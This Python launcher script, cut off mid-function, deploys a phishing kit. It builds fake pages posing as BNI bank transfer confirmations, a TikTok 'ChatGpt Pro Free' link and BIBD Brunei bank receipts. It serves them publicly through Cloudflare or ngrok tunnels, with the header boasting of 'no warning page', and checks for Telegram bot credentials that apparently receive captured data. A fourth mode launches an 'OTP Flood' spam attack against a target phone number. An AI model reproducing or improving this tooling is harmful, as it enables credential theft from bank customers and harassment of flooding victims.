#!/usr/bin/env python3
"""
METACYTECH - Interactive Launcher v3.0
Multi Template: BNI + TikTok + BIBD + OTP Flood
Cloudflare Tunnel (no warning page) + Next.js + Telegram + OTP Testing
"""

import os
import sys
import time
import json
import importlib.util
import re
import shutil
import subprocess
import threading
import urllib.request
import socket

IS_WIN = sys.platform == "win32"
IS_ANDROID = "ANDROID_ROOT" in os.environ or "TERMUX_VERSION" in os.environ

if IS_WIN:
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        os.system("")

def _find_pid_on_port(port):
    """Find PID listening on a given port. Cross-platform."""
    try:
        if IS_WIN:
            r = subprocess.run(["netstat", "-ano"], capture_output=True, text=True, timeout=5, **({"creationflags": subprocess.CREATE_NO_WINDOW} if hasattr(subprocess, "CREATE_NO_WINDOW") else {}))
            for line in r.stdout.split("\n"):
                if f":{port}" in line and "LISTENING" in line:
                    return line.split()[-1]
        else:
            r = subprocess.run(["ss", "-tlnp"], capture_output=True, text=True, timeout=5)
            for line in r.stdout.split("\n"):
                if f":{port}" in line:
                    m = re.search(r'pid=(\d+)', line)
                    if m:
                        return m.group(1)
            r = subprocess.run(["lsof", "-ti", f":{port}"], capture_output=True, text=True, timeout=5)
            pids = r.stdout.strip().split("\n")
            if pids and pids[0]:
                return pids[0]
    except Exception:
        pass
    return None

def check_port(port):
    # First try a direct TCP connection. This works reliably in Termux even
    # when `ss`/`lsof` are unavailable or cannot show process ownership.
    try:
        with socket.create_connection(("127.0.0.1", int(port)), timeout=1):
            return True
    except Exception:
        pass
    pid = _find_pid_on_port(port)
    return pid is not None

def kill_port(port):
    try:
        pid = _find_pid_on_port(port)
        if pid:
            if IS_WIN:
                subprocess.run(["taskkill", "/F", "/PID", pid], capture_output=True, timeout=5, **({"creationflags": subprocess.CREATE_NO_WINDOW} if hasattr(subprocess, "CREATE_NO_WINDOW") else {}))
            else:
                subprocess.run(["kill", "-9", pid], capture_output=True, timeout=5)
    except Exception:
        pass

def kill_all():
    procs = ["node", "cloudflared", "ngrok"]
    if IS_WIN:
        for exe in ["node.exe", "cloudflared.exe", "ngrok.exe"]:
            subprocess.run(["taskkill", "/F", "/IM", exe], capture_output=True, **({"creationflags": subprocess.CREATE_NO_WINDOW} if hasattr(subprocess, "CREATE_NO_WINDOW") else {}))
    else:
        for name in procs:
            subprocess.run(["pkill", "-9", "-f", name], capture_output=True)

def _find_cloudflared_path():
    p = shutil.which("cloudflared")
    if p:
        return p
    if IS_WIN:
        for path in [r"C:\Program Files (x86)\cloudflared\cloudflared.exe", r"C:\Program Files\cloudflared\cloudflared.exe"]:
            if os.path.exists(path):
                return path
    else:
        termux_path = "/data/data/com.termux/files/usr/bin/cloudflared"
        if os.path.exists(termux_path):
            return termux_path
        for path in ["/usr/bin/cloudflared", "/usr/local/bin/cloudflared"]:
            if os.path.exists(path):
                return path
    return None

APP_DIR = os.path.dirname(os.path.abspath(__file__))
SRC_PAGE = os.path.join(APP_DIR, "src", "app", "page.tsx")
SRC_LAYOUT = os.path.join(APP_DIR, "src", "app", "layout.tsx")
TEMPLATES_DIR = os.path.join(APP_DIR, "templates")

TEMPLATES = {
    "bni": {
        "name": "BNI - Bank Transfer",
        "icon": "[1]",
        "label": "Bank Transfer Verification",
        "title": "BNI - Hasil Transaksi",
        "description": "Konfirmasi transfer bank aman",
        "favicon": "favicon.svg",
        "og_image": "/bni-logo.svg",
        "dir": os.path.join(TEMPLATES_DIR, "bni"),
        "public_dir": os.path.join(TEMPLATES_DIR, "bni", "public"),
    },
    "tiktok": {
        "name": "TikTok - Video Share Link",
        "icon": "[2]",
        "label": "TikTok Video Verification",
        "title": "TikTok - ChatGpt Pro Free",
        "description": "vt.tiktok.com",
        "favicon": "favicon.svg",
        "og_image": "/LOGO-TIKTOK.png",
        "dir": os.path.join(TEMPLATES_DIR, "tiktok"),
        "public_dir": os.path.join(TEMPLATES_DIR, "tiktok", "public"),
    },
    "bibd": {
        "name": "BIDB - Brunei Darussalam",
        "icon": "[3]",
        "label": "BIDB Receipt + Verification",
        "title": "BIDB Brunei Darussalam",
        "description": "Resit Transaksi BIDB Brunei Darussalam",
        "favicon": "bibd.png",
        "og_image": "/bibdbrunei_logo.jpg",
        "dir": os.path.join(TEMPLATES_DIR, "bibd"),
        "public_dir": os.path.join(TEMPLATES_DIR, "bibd", "public"),
    },
    "otp_flood": {
        "name": "OTP Flood - Banjir Kode Verifikasi",
        "icon": "[4]",
        "label": "Spam OTP Multi-Brand",
        "title": "OTP Flood Testing",
        "description": "Banjir kode OTP WhatsApp ratusan brand",
        "is_otp_mode": True,
    },
}


class C:
    RST = "\033[0m"
    B = "\033[1m"
    DIM = "\033[2m"
    ITA = "\033[3m"
    SLATE  = "\033[38;5;243m"
    STEEL  = "\033[38;5;67m"
    TEAL   = "\033[38;5;37m"
    EMER   = "\033[38;5;42m"
    GOLD   = "\033[38;5;214m"
    CORAL  = "\033[38;5;203m"
    WHITE  = "\033[97m"
    BG_DIM = "\033[48;5;236m"
    BG_TEAL = "\033[48;5;30m"
    G = TEAL
    S = EMER
    W = GOLD
    E = CORAL
    RED = CORAL
    GRN = EMER
    YLW = GOLD
    CYN = TEAL
    BLU = STEEL
    WHT = WHITE
    MAG = CORAL
    BG_B = BG_DIM
    BG_R = CORAL


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def banner():
    cls()
    print()
    art_lines = [
        f"  {C.EMER}███╗   ███╗ ███████╗ ████████╗ █████╗  ██████╗ ██╗   ██╗ ████████╗ ███████╗ ██████╗  ██╗  ██╗{C.RST}",
        f"  {C.EMER}████╗ ████║ ██╔════╝ ╚══██╔══╝ ██╔══██╗ ██╔════╝ ╚██╗ ██╔╝ ╚══██╔══╝ ██╔════╝ ██╔════╝  ██║  ██║{C.RST}",
        f"  {C.EMER}██╔████╔██║ █████╗      ██║    ███████║ ██║       ╚████╔╝     ██║    █████╗   ██║      ███████║{C.RST}",
        f"  {C.EMER}██║╚██╔╝██║ ██╔══╝      ██║    ██╔══██║ ██║        ╚██╔╝      ██║    ██╔══╝   ██║      ██╔══██║{C.RST}",
        f"  {C.EMER}██║ ╚═╝ ██║ ███████╗    ██║    ██║  ██║ ╚██████╗    ██║       ██║    ███████╗ ╚██████╗ ██║  ██║{C.RST}",
        f"  {C.EMER}╚═╝     ╚═╝ ╚══════╝    ╚═╝    ╚═╝  ╚═╝  ╚═════╝    ╚═╝       ╚═╝    ╚══════╝  ╚═════╝ ╚═╝  ╚═╝{C.RST}",
    ]
    for line in art_lines:
        sys.stdout.write(line + "\n")
        time.sleep(0.01)
    print()
    print(f"  {C.TEAL}Cloudflare Tunnel  .  Next.js  .  Telegram{C.RST}")
    print()
    print(f"  {C.TEAL}[1]{C.RST}  BNI  {C.SLATE}Bank Transfer Verification{C.RST}")
    print(f"  {C.TEAL}[2]{C.RST}  TikTok  {C.SLATE}Video Share Link{C.RST}")
    print(f"  {C.TEAL}[3]{C.RST}  BIBD  {C.SLATE}Brunei Darussalam{C.RST}")
    print(f"  {C.TEAL}[4]{C.RST}  OTP Flood  {C.SLATE}Multi-Brand Spam{C.RST}")
    print()


def template_menu(current_template):
    for key, t in TEMPLATES.items():
        num = list(TEMPLATES.keys()).index(key) + 1
        marker = f"{C.EMER} active{C.RST}" if key == current_template else ""
        label = t["name"]
        desc = t["label"]
        print(f"  {C.TEAL}[{num}]{C.RST}  {C.WHITE}{label}{C.RST}")
        print(f"       {C.SLATE}{desc}{C.RST}  {marker}")
    print()


def menu(current_template):
    tmpl = TEMPLATES[current_template]
    is_otp = tmpl.get("is_otp_mode", False)

    if is_otp:
        print(f"  {C.TEAL}[1]{C.RST}  Mulai OTP Flood")
        print(f"       {C.SLATE}Jalankan serangan OTP ke target{C.RST}")
        print(f"  {C.TEAL}[2]{C.RST}  Ganti Template")
        print(f"  {C.TEAL}[3]{C.RST}  Keluar")
    else:
        print(f"  {C.TEAL}[1]{C.RST}  Mulai Semua")
        print(f"       {C.SLATE}Build + Server + Cloudflare Tunnel{C.RST}")
        print(f"  {C.TEAL}[2]{C.RST}  Hentikan Semua")
        print(f"  {C.TEAL}[3]{C.RST}  Status")
        print(f"  {C.TEAL}[4]{C.RST}  Salin URL")
        print(f"  {C.TEAL}[5]{C.RST}  Ganti Template")
        print(f"  {C.TEAL}[6]{C.RST}  Keluar")
    print()


def step(msg, status="ok"):
    icon = f"{C.EMER}ok{C.RST}" if status == "ok" else f"{C.E}xx{C.RST}" if status == "err" else f"{C.W}..{C.RST}"
    bar = f"{C.EMER}{'▓' * StepLine.BAR_WIDTH}{C.RST}"
    print(f"  {bar}  {icon}  {C.B}{msg}{C.RST}")


class StepLine:
    """Animated progress bar that runs on a daemon thread.
    
    Each step occupies exactly 2 lines in the terminal:
      Line 1: animated bar + phase name (overwritten by animation)
      Line 2: final status when stop() is called
    
    This prevents overlap with verbose messages printed between steps.
    """

    BAR_WIDTH = 20

    def __init__(self, phase):
        self.phase = phase
        self.running = False
        self._thread = None

    def start(self):
        self.running = True
        self._thread = threading.Thread(target=self._animate, daemon=True)
        self._thread.start()

    def _animate(self):
        pos = 0
        direction = 1
        while self.running:
            fill = pos
            filled = f"{C.EMER}{'▓' * fill}{C.RST}"
            empty = f"{C.SLATE}{'░' * (StepLine.BAR_WIDTH - fill)}{C.RST}"
            bar = filled + empty
            # Write to stderr so stdout messages (build logs etc) don't collide
            sys.stderr.write(f"\r  {bar}  {C.DIM}{self.phase}{C.RST}   ")
            sys.stderr.flush()
            time.sleep(0.08)
            pos += direction
            if pos >= StepLine.BAR_WIDTH - 1 or pos <= 0:
                direction *= -1

    def stop(self, ok=True):
        self.running = False
        if self._thread:
            self._thread.join(timeout=0.3)
        time.sleep(0.05)
        bar = f"{C.EMER}{'▓' * StepLine.BAR_WIDTH}{C.RST}"
        icon = f"{C.EMER}ok{C.RST}" if ok else f"{C.E}xx{C.RST}"
        # Clear animation from stderr, print final to stdout
        sys.stderr.write(f"\r{' ' * 80}\r")
        sys.stderr.flush()
        sys.stdout.write(f"  {bar}  {icon}  {C.B}{self.phase}{C.RST}\n")
        sys.stdout.flush()

    def pause(self):
        """Pause animation and clear the line so messages can be printed below."""
        self.running = False
        if self._thread:
            self._thread.join(timeout=0.3)
        sys.stdout.write(f"\r{' ' * 80}\r")
        sys.stdout.flush()

    def resume(self):
        """Resume animation on a fresh line below any messages."""
        self.running = True
        self._thread = threading.Thread(target=self._animate, daemon=True)
        self._thread.start()

    def log(self, msg, color=None):
        """Pause animation, print a dimmed message, resume animation below it.
        
        Usage inside verbose functions:
            sl.log(\"Android: downgrading Next.js...\")
        """
        self.pause()
        c = color or C.SLATE
        print(f"  {c}{msg}{C.RST}")
        self.resume()


class Engine:
    def __init__(self):
        self.app_dir = APP_DIR
        self.app_port = 3000
        self.nextjs_proc = None
        self.tunnel_proc = None
        self.url = None
        self.building = False
        self.current_template = "bni"
        self.custom_title = None

    def _server_env(self):
        """Return environment dict with Next.js settings and Termux CA bundle."""
        env = os.environ.copy()
        env["NEXT_TELEMETRY_DISABLED"] = "1"
        env["NODE_OPTIONS"] = "--max-old-space-size=4096"
        if IS_ANDROID:
            prefix = env.get("PREFIX", "/data/data/com.termux/files/usr")
            cert_file = os.path.join(prefix, "etc", "tls", "cert.pem")
            if os.path.exists(cert_file):
                env["SSL_CERT_FILE"] = cert_file
                env["REQUESTS_CA_BUNDLE"] = cert_file
                env["NODE_EXTRA_CA_CERTS"] = cert_file
            # Safety net: Node.js on Termux may not respect extra CA certs
            # due to using BoringSSL/Node's own cert store. This allows
            # Telegram API calls to work in development/testing.
            env["NODE_TLS_REJECT_UNAUTHORIZED"] = "0"
        return env

    def _nw(self):
        flags = {}
        if hasattr(subprocess, "CREATE_NO_WINDOW"):
            flags["creationflags"] = subprocess.CREATE_NO_WINDOW
        return flags

    def _npm_install(self, verbose=False):
        """Install Node dependencies with Termux-safe flags and visible errors."""
        cmd = ["npm", "install"]
        if IS_ANDROID:
            cmd.append("--no-bin-links")
        r = subprocess.run(cmd, cwd=self.app_dir, shell=IS_WIN, capture_output=True, text=True, timeout=900 if IS_ANDROID else 180)
        if r.returncode != 0:
            if verbose:
                print(f"  {C.RED}npm install failed ({r.returncode}){C.RST}")
                if r.stdout:
                    print(f"  {C.DIM}─── npm stdout ──────────────────────────────{C.RST}")
                    for line in r.stdout.strip().split("\n")[-30:]:
                        print(f"  {C.DIM}{line}{C.RST}")
                if r.stderr:
                    print(f"  {C.DIM}─── npm stderr ──────────────────────────────{C.RST}")
                    for line in r.stderr.strip().split("\n")[-30:]:
                        print(f"  {C.CORAL}{line}{C.RST}")
            return False
        return True

    def _next_bin(self):
        return os.path.join(self.app_dir, "node_modules", "next", "dist", "bin", "next")

    def _ensure_next_installed(self, verbose=False):
        """Ensure Next.js is actually installed, not just node_modules exists."""
        if os.path.exists(self._next_bin()):
            return True
        if verbose:
            print(f"{C.YLW}  Next.js binary missing, reinstalling dependencies...{C.RST}")
        nm_dir = os.path.join(self.app_dir, "node_modules")
        lock_file = os.path.join(self.app_dir, "package-lock.json")
        if os.path.exists(nm_dir):
            shutil.rmtree(nm_dir, ignore_errors=True)
        if os.path.exists(lock_file):
            try: os.remove(lock_file)
            except Exception: pass
        return self._npm_install(verbose=verbose) and os.path.exists(self._next_bin())

    def _next_cmd(self, *args):
        """Return a Next.js command that works when npm --no-bin-links is used."""
        next_bin = self._next_bin()
        if os.path.exists(next_bin):
            return ["node", next_bin, *args]
        return ["npx", "next", *args]

    def apply_template(self, template_key):
        return self._apply_silent(template_key, verbose=True)

    def _apply_silent(self, template_key, verbose=False):
        tmpl = TEMPLATES.get(template_key)
        if not tmpl:
            if verbose: print(f"{C.RED}  Template '{template_key}' not found!{C.RST}")
            return False
        tmpl_dir = tmpl["dir"]
        tmpl_page = os.path.join(tmpl_dir, "page.tsx")
        if not os.path.exists(tmpl_page):
            if verbose: print(f"{C.RED}  Template file not found: {tmpl_page}{C.RST}")
            return False
        SRC_PUBLIC = os.path.join(self.app_dir, "public")
        tmpl_pub = tmpl.get("public_dir")
        shutil.copy2(tmpl_page, SRC_PAGE)
        tmpl_layout = os.path.join(tmpl_dir, "layout.tsx")
        if os.path.exists(tmpl_layout):
            shutil.copy2(tmpl_layout, SRC_LAYOUT)
            # Inject custom title into layout if set
            if template_key == "tiktok" and self.custom_title:
                self._inject_title_into_layout(SRC_LAYOUT, self.custom_title)
        if tmpl_pub and os.path.isdir(tmpl_pub):
            for fname in os.listdir(tmpl_pub):
                src_f = os.path.join(tmpl_pub, fname)
                dst_f = os.path.join(SRC_PUBLIC, fname)
                if os.path.isfile(src_f):
                    shutil.copy2(src_f, dst_f)
        self.current_template = template_key
        return True

    def _inject_title_into_layout(self, layout_path, title):
        """Replace hardcoded TikTok title strings in layout.tsx with custom title."""
        try:
            with open(layout_path, "r", encoding="utf-8") as f:
                content = f.read()
            old_title = TEMPLATES["tiktok"]["title"]
            content = content.replace(old_title, title)
            with open(layout_path, "w", encoding="utf-8") as f:
                f.write(content)
            return True
        except Exception as e:
            return False

    def check_port(self, port):
        return check_port(port)

    def kill_port(self, port):
        kill_port(port)

    def kill_all(self):
        kill_all()
        self.nextjs_proc = None
        self.tunnel_proc = None

    def build(self, sl=None):
        return self._build_silent(verbose=True, sl=sl)

    def _build_silent(self, verbose=False, sl=None):
        nm = os.path.join(self.app_dir, "node_modules")
        if not os.path.exists(nm):
            if verbose: print(f"  {C.W}  Installing dependencies...{C.RST}")
            if not self._npm_install(verbose=verbose):
                return False
        env = os.environ.copy()
        env["NEXT_TELEMETRY_DISABLED"] = "1"
        env["NODE_OPTIONS"] = "--max-old-space-size=4096"
        did_downgrade = False
        pkg_json = os.path.join(self.app_dir, "package.json")
        pkg_bak = pkg_json + ".bak"
        try:
            if IS_ANDROID:
                with open(pkg_json, "r") as f:
                    pkg_data = json.load(f)
                next_ver = pkg_data.get("dependencies", {}).get("next", "")
                if next_ver and not next_ver.startswith("15"):
                    print(f"{C.YLW}  Android: downgrading Next.js to v15 (Turbopack v16 not supported on ARM)...{C.RST}")
                    shutil.copy2(pkg_json, pkg_bak)
                    pkg_data["dependencies"]["next"] = "15.3.3"
                    dev_deps = pkg_data.get("devDependencies", {})
                    if "eslint-config-next" in dev_deps:
                        dev_deps["eslint-config-next"] = "15.3.3"
                    with open(pkg_json, "w") as f:
                        json.dump(pkg_data, f, indent=2)
                    # Must delete node_modules and package-lock.json for clean reinstall
                    print(f"{C.DIM}  Cleaning node_modules for fresh install...{C.RST}")
                    nm_dir = os.path.join(self.app_dir, "node_modules")
                    lock_file = os.path.join(self.app_dir, "package-lock.json")
                    if os.path.exists(nm_dir):
                        shutil.rmtree(nm_dir, ignore_errors=True)
                    if os.path.exists(lock_file):
                        os.remove(lock_file)
                    if not self._npm_install(verbose=verbose):
                        return False
                    did_downgrade = True
                    print(f"{C.GRN}  Next.js v15.3.3 ready for Android build (uses Webpack){C.RST}")
        except Exception as e:
            print(f"{C.RED}  Failed to downgrade Next.js: {e}{C.RST}")
        build_timeout = 600 if IS_ANDROID else 120
        if not self._ensure_next_installed(verbose=verbose):
            if verbose:
                print(f"  {C.RED}Next.js install incomplete: node_modules/next/dist/bin/next not found{C.RST}")
            return False
        r = subprocess.run(self._next_cmd("build"), cwd=self.app_dir, env=env, shell=IS_WIN, capture_output=True, text=True, timeout=build_timeout)
        # KEEP v15 on Android — don't restore original package.json
        # so node_modules matches and server starts correctly
        if did_downgrade and os.path.exists(pkg_bak):
            try:
                if not IS_ANDROID:
                    shutil.copy2(pkg_bak, pkg_json)
                os.remove(pkg_bak)
            except Exception:
                pass
        if r.returncode == 0:
            if verbose: print(f"  ok  Build successful!")
            return True
        if verbose:
            print(f"  xx  Build failed!")
            print(f"  {C.DIM}─── stdout ─────────────────────────────────{C.RST}")
            if r.stdout:
                for e in r.stdout.strip().split("\n")[-20:]:
                    print(f"  {C.DIM}{e}{C.RST}")
            print(f"  {C.DIM}─── stderr ─────────────────────────────────{C.RST}")
            if r.stderr:
                for e in r.stderr.strip().split("\n")[-20:]:
                    print(f"  {C.CORAL}{e}{C.RST}")
            print(f"  {C.DIM}─────────────────────────────────────────────{C.RST}")
        return False

    def start_server(self):
        return self._start_server_silent(verbose=True)

    def _start_server_silent(self, verbose=False):
        if self.check_port(self.app_port):
            self.kill_port(self.app_port)
            time.sleep(3)
        env = self._server_env()
        log_path = os.path.join(self.app_dir, "next-server.log")
        try:
            if os.path.exists(log_path):
                os.remove(log_path)
        except Exception:
            pass
        log_f = open(log_path, "w", encoding="utf-8")
        self.nextjs_proc = subprocess.Popen(
            self._next_cmd("start", "-p", str(self.app_port)),
            cwd=self.app_dir, env=env,
            stdout=log_f, stderr=subprocess.STDOUT,
            shell=IS_WIN
        )
        for i in range(45 if IS_ANDROID else 30):
            time.sleep(1)
            if self.nextjs_proc.poll() is not None:
                break
            if self.check_port(self.app_port):
                return True
        if verbose:
            print(f"  xx  Server gagal start dalam {45 if IS_ANDROID else 30} detik!")
            print(f"  {C.DIM}─── next-server.log ─────────────────────────{C.RST}")
            try:
                with open(log_path, "r", encoding="utf-8", errors="replace") as f:
                    lines = f.read().strip().split("\n")
                    for line in lines[-40:]:
                        if line.strip():
                            print(f"  {C.CORAL}{line}{C.RST}")
            except Exception as e:
                print(f"  {C.CORAL}Could not read next-server.log: {e}{C.RST}")
            print(f"  {C.DIM}─────────────────────────────────────────────{C.RST}")
        return False

    def _find_cloudflared(self):
        return _find_cloudflared_path()

    def _install_cloudflared_termux(self, verbose=False):
        if not IS_ANDROID or not shutil.which("pkg"):
            return None
        if verbose:
            print(f"  ..  cloudflared not found, installing via pkg...")
        # Some Termux versions need update first
        subprocess.run(["pkg", "update", "-y"], capture_output=True, timeout=120)
        r = subprocess.run(["pkg", "install", "cloudflared", "-y"], capture_output=True, text=True, timeout=300)
        # Re-check using the known Termux path directly (bypass PATH cache)
        termux_path = "/data/data/com.termux/files/usr/bin/cloudflared"
        if os.path.exists(termux_path):
            if verbose:
                print(f"  ok  cloudflared installed")
            return termux_path
        cf = shutil.which("cloudflared")
        if cf:
            if verbose:
                print(f"  ok  cloudflared installed: {cf}")
            return cf
        if verbose:
            print(f"  xx  cloudflared install failed")
            if r.stdout:
                print(f"  {C.DIM}─── pkg stdout ──────────────────────────────{C.RST}")
                for line in r.stdout.strip().split("\n")[-30:]:
                    print(f"  {C.DIM}{line}{C.RST}")
            if r.stderr:
                print(f"  {C.DIM}─── pkg stderr ──────────────────────────────{C.RST}")
                for line in r.stderr.strip().split("\n")[-30:]:
                    print(f"  {C.CORAL}{line}{C.RST}")
        return None

    def start_tunnel(self):
        return self._start_tunnel_silent(verbose=True)

    def _repair_termux_certificates(self, verbose=False):
        if not IS_ANDROID or not shutil.which("pkg"):
            return False
        if verbose:
            print(f"  ..  TLS certificate issue detected, checking Termux CA certificates...")
        try:
            r = subprocess.run(["pkg", "install", "ca-certificates", "openssl-tool", "-y"], capture_output=True, text=True, timeout=180)
            cert_file = os.path.join(os.environ.get("PREFIX", "/data/data/com.termux/files/usr"), "etc", "tls", "cert.pem")
            if os.path.exists(cert_file):
                if verbose:
                    print(f"  ok  Termux CA bundle found: {cert_file}")
                return True
            if verbose:
                print(f"  xx  Termux CA bundle not found: {cert_file}")
            return r.returncode == 0
        except Exception:
            return False

    def _run_cloudflared_tunnel(self, cf, log, timeout, verbose=False):
        try:
            if os.path.exists(log): os.remove(log)
        except: pass
        if verbose:
            print(f"  ..  Starting cloudflared tunnel...")
        env = os.environ.copy()
        if IS_ANDROID:
            prefix = env.get("PREFIX", "/data/data/com.termux/files/usr")
            cert_file = os.path.join(prefix, "etc", "tls", "cert.pem")
            cert_dir = os.path.join(prefix, "etc", "tls", "certs")
            if os.path.exists(cert_file):
                env["SSL_CERT_FILE"] = cert_file
                env["REQUESTS_CA_BUNDLE"] = cert_file
            if os.path.isdir(cert_dir):
                env["SSL_CERT_DIR"] = cert_dir
        self.tunnel_proc = subprocess.Popen(
            [cf, "tunnel", "--url", f"http://localhost:{self.app_port}"],
            stdout=open(log, "w", encoding="utf-8"),
            stderr=subprocess.STDOUT,
            env=env,
            **self._nw()
        )
        waited = 0
        last_content = ""
        while waited < timeout:
            time.sleep(3)
            waited += 3
            try:
                with open(log, "r", encoding="utf-8", errors="replace") as f:
                    content = f.read()
                    last_content = content
                    all_urls = re.findall(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", content)
                    tunnel_urls = [u for u in set(all_urls) if "api" not in u.lower()]
                    if tunnel_urls:
                        self.url = max(tunnel_urls, key=lambda u: len(u.split(".")[0]))
                        return self.url, content
                    if "certificate signed by unknown authority" in content or "failed to verify certificate" in content:
                        return None, content
            except Exception:
                pass
        return None, last_content

    def _start_tunnel_silent(self, verbose=False):
        cf = self._find_cloudflared()
        if not cf:
            cf = self._install_cloudflared_termux(verbose=verbose)
        if not cf:
            if verbose:
                print(f"  ..  Cloudflared not found, trying ngrok...")
            return self._start_ngrok_fallback(verbose=verbose)
        self.kill_tunnel()
        time.sleep(2)
        log = os.path.join(self.app_dir, "tunnel.log")
        timeout = 60 if IS_ANDROID else 45

        url, content = self._run_cloudflared_tunnel(cf, log, timeout, verbose=verbose)
        if url:
            return url

        if IS_ANDROID and content and (
            "certificate signed by unknown authority" in content
            or "failed to verify certificate" in content
        ):
            self.kill_tunnel()
            self._repair_termux_certificates(verbose=verbose)
            time.sleep(2)
            if verbose:
                print(f"  ..  Retrying cloudflared after CA repair...")
            url, content = self._run_cloudflared_tunnel(cf, log, timeout, verbose=False)
            if url:
                return url

        if verbose:
            print(f"  xx  Cloudflare: no URL after {timeout}s")
            print(f"  {C.DIM}─── tunnel.log ─────────────────────────────{C.RST}")
            try:
                with open(log, "r", encoding="utf-8", errors="replace") as f:
                    for line in f.read().strip().split("\n")[-40:]:
                        if line.strip():
                            print(f"  {C.CORAL}{line}{C.RST}")
            except Exception as e:
                print(f"  {C.CORAL}Could not read tunnel.log: {e}{C.RST}")
            print(f"  {C.DIM}─────────────────────────────────────────────{C.RST}")
        if verbose: print(f"  ..  Cloudflare Tunnel failed, trying ngrok...")
        return self._start_ngrok_fallback(verbose=verbose)

    def _start_ngrok_fallback(self, verbose=False):
        ngrok = shutil.which("ngrok")
        if not ngrok and IS_ANDROID:
            if verbose:
                print(f"  ..  ngrok not found, installing via pkg...")
            subprocess.run(["pkg", "update", "-y"], capture_output=True, timeout=120)
            r = subprocess.run(["pkg", "install", "ngrok", "-y"], capture_output=True, text=True, timeout=300)
            ngrok = shutil.which("ngrok")
            if not ngrok:
                ngrok_path = "/data/data/com.termux/files/usr/bin/ngrok"
                if os.path.exists(ngrok_path):
                    ngrok = ngrok_path
        if not ngrok:
            if verbose: print(f"  xx  Neither cloudflared nor ngrok found!")
            return None
        self.kill_tunnel()
        time.sleep(2)
        if verbose: print(f"  ..  Starting ngrok tunnel...")
        self.tunnel_proc = subprocess.Popen(
            [ngrok, "http", str(self.app_port), "--log=stdout"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            **self._nw()
        )
        for _ in range(20):
            time.sleep(3)
            try:
                with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=5) as r:
                    data = json.loads(r.read())
                    for t in data.get("tunnels", []):
                        if t.get("proto") == "https":
                            self.url = t["public_url"]
                            return self.url
            except Exception:
                pass
        if verbose:
            print(f"  xx  ngrok: no URL after 60s")
            print(f"  {C.DIM}  Tip: run 'ngrok config add-authtoken <TOKEN>' if ngrok requires auth{C.RST}")
        return None

    def kill_tunnel(self):
        if IS_WIN:
            for exe in ["cloudflared.exe", "ngrok.exe"]:
                subprocess.run(["taskkill", "/F", "/IM", exe], capture_output=True, **({"creationflags": subprocess.CREATE_NO_WINDOW} if hasattr(subprocess, "CREATE_NO_WINDOW") else {}))
        else:
            for name in ["cloudflared", "ngrok"]:
                subprocess.run(["pkill", "-9", "-f", name], capture_output=True)
        log = os.path.join(self.app_dir, "tunnel.log")
        if os.path.exists(log):
            try: os.remove(log)
            except: pass
        self.tunnel_proc = None

    def has_telegram(self):
        env = os.path.join(self.app_dir, ".env.local")
        if os.path.exists(env):
            with open(env) as f:
                c = f.read()
                return "TELEGRAM_BOT_TOKEN" in c and "TELEGRAM_CHAT_ID" in c
        return False

    def start_all(self):
        tmpl = TEMPLATES[self.current_template]
        print()
        sl = StepLine("applying template")
        sl.start()
        if not self._apply_silent(self.current_template):
            sl.stop(False)
            return False
        sl.stop()
        print()

        sl = StepLine("building")
        sl.start()
        if not self._build_silent(verbose=True):
            sl.stop(False)
            return False
        sl.stop()
        print()

        sl = StepLine("starting server")
        sl.start()
        if not self._start_server_silent(verbose=True):
            sl.stop(False)
            return False
        sl.stop()
        print()

        sl = StepLine("starting tunnel")
        sl.start()
        url = self._start_tunnel_silent(verbose=True)
        if url:
            sl.stop()
            print()
            sl = StepLine("rebuilding with url")
            sl.start()
            self._update_silent(url)
            sl.stop()
            print()
            sl = StepLine("rebuilding")
            sl.start()
            self._build_silent(verbose=True)
            self._restart_silent()
            sl.stop()
        else:
            sl.stop(False)
        self.show_ready(url)
        return True

    def _update_silent(self, url):
        if not os.path.exists(SRC_LAYOUT):
            return
        with open(SRC_LAYOUT, "r", encoding="utf-8") as f:
            content = f.read()
        if "metadataBase" in content:
            content = re.sub(
                r'metadataBase:\s*new URL\("[^"]*"\)',
                'metadataBase: new URL("' + url + '")',
                content
            )
        else:
            content = content.replace(
                "};\n\nexport default",
                '  metadataBase: new URL("' + url + '"),\n};\n\nexport default'
            )
        with open(SRC_LAYOUT, "w", encoding="utf-8") as f:
            f.write(content)

    def _restart_silent(self):
        self.kill_port(self.app_port)
        time.sleep(2)
        env = self._server_env()
        self.nextjs_proc = subprocess.Popen(self._next_cmd("start", "-p", str(self.app_port)), cwd=self.app_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=IS_WIN)
        for i in range(10):
            time.sleep(1)
            if self.check_port(self.app_port):
                return True
        return True

    def _update_metadata_base(self, url):
        self._update_silent(url)
        print(f"  ok  metadataBase updated: {url}")

    def _restart_server(self):
        self._restart_silent()
        print(f"  ok  Server restarted")

    def stop_all(self):
        print(f"\n  ..  Stopping all services...")
        if self.nextjs_proc:
            try:
                self.nextjs_proc.terminate()
                self.nextjs_proc.wait(timeout=5)
            except: pass
        self.kill_port(self.app_port)
        self.kill_tunnel()
        self.url = None
        step("All services stopped")
        print()

    def show_status(self):
        tmpl = TEMPLATES[self.current_template]
        srv = self.check_port(self.app_port)
        step(f"server  {'running' if srv else 'stopped'} (port {self.app_port})")
        step(f"template  {tmpl['name']}")
        url = None
        log = os.path.join(self.app_dir, "tunnel.log")
        if os.path.exists(log):
            try:
                with open(log) as f:
                    content = f.read()
                    all_urls = re.findall(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", content)
                    unique_urls = list(set(all_urls))
                    tunnel_urls = [u for u in unique_urls if "api" not in u.lower()]
                    if tunnel_urls:
                        url = max(tunnel_urls, key=lambda u: len(u.split(".")[0]))
                        self.url = url
            except: pass
        if url:
            step(f"tunnel running ({url})")
        else:
            step("tunnel stopped")
        step(f"telegram {'configured' if self.has_telegram() else 'not configured'}")
        print()

    def show_ready(self, url=None):
        tmpl = TEMPLATES[self.current_template]
        print()
        if url:
            print(f"  url  {url}")
        print(f"  local  http://localhost:{self.app_port}")
        print()


def choose_template(eng):
    banner()
    template_menu(eng.current_template)
    tmpl_keys = list(TEMPLATES.keys())
    print(f"{C.CYN}  Pilih template (1-{len(tmpl_keys)}): {C.RST}", end="")
    choice = input().strip()
    if choice in [str(i) for i in range(1, len(tmpl_keys)+1)]:
        idx = int(choice) - 1
